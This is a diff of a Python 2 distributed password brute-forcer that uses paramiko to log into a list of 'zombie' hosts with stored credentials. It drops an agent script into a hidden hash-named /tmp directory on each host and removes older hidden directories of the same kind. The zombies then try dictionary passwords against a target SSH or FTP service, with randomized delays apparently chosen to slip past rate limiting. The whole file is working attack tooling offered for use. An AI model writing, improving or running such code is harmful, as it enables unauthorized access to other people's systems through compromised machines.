@@ -6,6 +6,8 @@ import time
 import random
 import paramiko
 import hashlib
+import os
+import sys
 from threading import*
 
 conn_no = 5
@@ -13,9 +15,10 @@ conn_lock = Semaphore(value=conn_no)
 Found = False
 Fails = 0
 waitime = 5
+agent_script_name = "zombie.py"
+remote_path = "/tmp/."+hashlib.md5(str(time.time())).hexdigest()+"/"
 
-
-def get_zombie(zombie_file):
+def get_zombies(zombie_file):
     zombie_list = []
     fp = open(zombie_file,'r')
     
@@ -23,119 +26,159 @@ def get_zombie(zombie_file):
         zombie_list.append(line.strip('\r').strip('\n'))
     return zombie_list
 
-def zombie_scp(s,local_file,remote_file):
-    s.exec_command("rm -rf " + remote_file)
+def zombie_scp(s,local_file,remote_path):
     sftp = paramiko.SFTPClient.from_transport(s.get_transport())
     sftp = s.open_sftp()
-    sftp.put(local_file, remote_file)
+    sftp.put(local_file, remote_path)
 
-def update_zombie_script(zombie_list):
-    local_file = "zombie.py"
-    remote_file = "/tmp/zombie.py"
+def check_zombies(zombie_list):
+    local_file = agent_script_name
     count = 0
-    for zombie_info in zombie_list:
+    while count < len(zombie_list):
         try:
+            zombie_info = zombie_list[count]
             zmb_host = zombie_info.split(':',2)[0]
             zmb_user = zombie_info.split(':',2)[1]
             zmb_pwd = zombie_info.split(':',2)[2]
-        
+
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             ssh.connect(zmb_host, 22, zmb_user, zmb_pwd)
-            zombie_scp(ssh,local_file,remote_file)
-            ssh.close()
-            count += 1
+            ssh.exec_command("a=($(ls -a |grep '\.'|awk '{if(length($0)==33) {print $0}}')) && \
+                for i in \"${a[@]}\";do rm -rf \"$i\";done; mkdir -p " + remote_path)
+            zombie_scp(ssh, local_file, remote_path + local_file)
+            stdin, stdout, stderr = ssh.exec_command("/usr/bin/python2.7 -c \"import paramiko;from ftplib import FTP\"&& echo \"anything ok!\"")
+            if "anything ok!" not in stdout.read():
+                print "...Zombie-host(%s)\t:\033[1;31m%s\033[0m...%s." %(zmb_host,"unavailable","Failed to start C2agent")
+                del(zombie_list[count])
+                continue
+            print "...Zombie-host(%s)\t:\033[1;32m%s\033[0m" %(zmb_host,"available")
+            count+=1
         except Exception, e:
-            print "Zombie(" +zmb_host+") connection failed!" + str(e)
-            del zombie_list[count]
+            print "...Zombie-host(%s)\t:\033[1;31m%s\033[0m...%s" %(zmb_host,"unavailable",e)
+            del(zombie_list[count])
             pass
+    if zombie_list:
+        #print zombie_list
+        return zombie_list
+    else:
+        print "\033[1;31m[Err]\033[0m None zombie-host available.\n"
+        exit(1)
 
-def zombie_work(s, host, port, user, password):
+def zombie_work(s, target_link, user, password):
     global Found
-    #ssh
-    payload = "cd /tmp; /usr/bin/python2.7 zombie.py -H "+ host +" -u " + user + " -P " + password + " -p "+ port
+    payload = "cd %s; /usr/bin/python2.7 zombie.py -T %s -u %s -p %s" %(remote_path, target_link, user, password)
+    #print payload
     stdin, stdout, stderr = s.exec_command(payload)
-    
-    if hashlib.md5("Found SSH Password").hexdigest() in stdout.read():
+    if "{successful:" in stdout.read():
         Found = True
-        print '[+] Exiting: Found SSH Password --> ' + password
+        print '\n[+] Congratulations. The password is: \033[1;32m%s\033[0m' % password
+        conn_lock.release()
         exit(0)
-    
-def conduct_zombie(host, port, user, password, zombie, release):
 
+def conduct_zombie(target_link, user, password, zombie, release):
+    global Found
     zmb_host = zombie.split(':',2)[0]
     zmb_user = zombie.split(':',2)[1]
     zmb_pwd = zombie.split(':',2)[2]
-    
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(zmb_host, 22, zmb_user, zmb_pwd)
-        zombie_work(ssh, host, port, user, password)
+        zombie_work(ssh, target_link, user, password)
         ssh.close()
-        
     except Exception, e:
-        print "Zombie(" +zmb_host+") connection failed!" + str(e)
+        print "\n\033[1;33m[Wrn]\033[0m Zombie-host(%s) connection failed! %s" %(zmb_host,str(e))
         pass
     finally:
         time.sleep(random.uniform(waitime, waitime * 2))
         conn_lock.release()
 
+def check_target_info(options, parser):
+    if options.target_link==None and (options.service_type==None or options.host==None or options.port==None):
+        print "\033[1;31m[Err]\033[0m Target information incorrect! Check & run again."
+        print parser.usage
+        exit(1)
+    if options.target_link==None: 
+        target_link = options.service_type+"://"+options.target_host+":"+options.target_port
+    else:
+        if len(options.target_link.split(':',2)) != 3:
+            print parser.usage
+            exit(1)
+    target_link = options.target_link
+    return target_link
+
 def main():
     global conn_lock
     global waitime
-    
-    parser = optparse.OptionParser('usage % prog -H <target host> -p <target_port> ' +\
-                                   '-u <user> -F <password-list -Z <zombie_file>' +\
-                                   '-T <type> -l <threads> -c <interval>' )
+    parser = optparse.OptionParser('usage % prog [-S <srv_type> -H <target_host> -p <target_port>]|[-T <target_link>] \n\t-u <user> '\
+                                   + '-P <password-list> -Z <zombie_file>  -t <threads> -c <interval>' )
+    parser.add_option('-S', '--srv_type', dest = 'service_type', type = 'string' , default = 'ssh' , help = 'Support: ssh,ftp.    @TODO telnet/custom ')
     parser.add_option('-H', '--host', dest = 'target_host', type = 'string', help = 'Host IP of target.')
     parser.add_option('-p', '--port', dest = 'target_port', default = '22', help = 'Port to connect to on the target.')
+    parser.add_option('-T', '--target', dest = 'target_link', type = 'string' , help = 'Provide target information. Format: ssh://10.1.1.1:22')
     parser.add_option('-u', '--username', dest = 'user', type = 'string', help = 'Provide username when connect to the target. ')
-    parser.add_option('-F', '--passwdfile', dest = 'passwd_file', type = 'string', help = 'Dictionary of passwords.')
+    parser.add_option('-P', '--passwdfile', dest = 'passwd_file', type = 'string', help = 'Dictionary of passwords.')
     parser.add_option('-Z', '--zombiefile', dest = 'zombie_file', type = 'string', help = 'Provide zombie\'s resource. Format: 192.168.0.1:root:toor.')
-    parser.add_option('-T', '--srv_type', dest = 'service_type', type = 'string' , default = '6' , help = 'Only support SSH service this version.')
-    parser.add_option('-l', '--threads', dest = 'conn_num', type = 'string', help = 'Run threads number of connects in parallel. default 5.')
-    parser.add_option('-c', '--interval', dest = 'waitime', type = 'string', help = 'Defines the minimum wait time in seconds, default 5s. \
-                      DBF use random time interval technology. The actual time interval is 5.0~10.0 seconds.')
-    
+    parser.add_option('-t', '--threads', dest = 'conn_num', type = 'string', help = 'Run threads number of connects in parallel. default 5.')
+    parser.add_option('-c', '--interval', dest = 'waitime', type = 'string', help = 'Defines the minimum wait time in seconds, default 5s. '\
+                      + 'DBF use random time interval technology. The actual time interval is 5.0~10.0 seconds.')
     (options,args) = parser.parse_args()
-    host = options.target_host
-    user = options.user
-    port = options.target_port
-    service_type = options.service_type
-    passwd_file = options.passwd_file
-    zombie_file = options.zombie_file
-    conn_num = options.conn_num
     
+#check target information
+    target_link = check_target_info(options,parser)
+    user = 'root'
+    passwd_file = options.passwd_file
+    if options.user:
+        user = options.user
+    else :
+        print "\033[1;33m[Wrn]\033[0m Target username is not specified, use `root`."
+    print "[+] Target --> %s/?username=%s&passwdfile=%s"  %(target_link, user, passwd_file)   
+# check zombies
+    zombie_file = options.zombie_file
+    print "[+] Check zombies......"
+    zombie_list = get_zombies(zombie_file)
+    zombie_total = len(zombie_list)
+    zombie_list = check_zombies(zombie_list)
+    zombie_available = len(zombie_list)
+    print "> (%d/%d) zombies available.\n" %(zombie_available,zombie_total)
+    
+# set global variables 
+    conn_num = options.conn_num
     if(conn_num):
+        if conn_num > zombie_available:
+            conn_num = zombie_available
         conn_lock = Semaphore(value=int(conn_num))
     if(options.waitime):
         waitime = float(options.waitime)
-    if host == None or user == None or passwd_file == None or zombie_file == None:
-        print parser.usage
-        exit(0)
-    
+        
+# fire on target!
+
+    cmd_get_rows_num = "wc -l "+ passwd_file +" |awk '{print $1}' | sed -n '1p'"
+    try:
+        passwd_total = os.popen(cmd_get_rows_num).readlines()[0].strip()
+    except IndexError:
+        print "\033[1;31m[Err]\033[0m Passwords file not exist."
+        exit(1)
+    print "[+] Fire in few seconds. Please wait......"
+    time.sleep(5)
     fp = open(passwd_file,'r')
-    zombie_list = get_zombie(zombie_file)
-    zombie_total = len(zombie_list)
-    update_zombie_script(zombie_list)
-    zombie_available = len(zombie_list)
-    print "Total %d \nAvailable %d\n" %(zombie_total,zombie_available)
-    
     count = 0
     for password in fp.readlines():
         if Found == True:
             exit(0)
+        if not count%100:
+            print "\rAbout %.2f%% done ... Already %d attempts." %(count*100/float(passwd_total),count) ,
+            sys.stdout.flush()
         count += 1
-        if not count%10:
-            print "Count: %d" %count
-        
         zombie = zombie_list[count%zombie_available]
         password = password.strip('\r').strip('\n')
         
         conn_lock.acquire()
-        t = Thread(target = conduct_zombie, args = (host, port, user, password, zombie, True))
+        t = Thread(target = conduct_zombie, args = (target_link, user, password, zombie, True))
         child = t.start()
-    print "Count total:%d \n Complete!" %count
+    print "\rAbout %.2f%% done ... Already %d attempts." %(count*100/float(passwd_total),count)
+    print "\033[1;33m[Wrn]\033[0m Found nothing."
+
 if __name__ == '__main__':
     main()
